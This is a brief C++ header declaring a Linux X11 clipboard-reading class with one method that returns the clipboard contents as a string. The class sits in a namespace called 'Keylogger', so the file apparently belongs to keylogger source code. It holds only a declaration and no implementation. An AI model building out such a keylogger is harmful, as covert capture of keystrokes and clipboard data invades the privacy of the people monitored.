#ifndef CLIPBOARD_HANDLER_LINUX_X11_H
#define CLIPBOARD_HANDLER_LINUX_X11_H

#ifdef __linux__

#include "IClipboardHandler.h"

namespace Keylogger {

class ClipboardHandlerLinuxX11 : public IClipboardHandler {
 public:
    std::string getClipboardString();
};

}

#endif // defined(__linux__)

#endif // CLIPBOARD_HANDLER_LINUX_X11_H
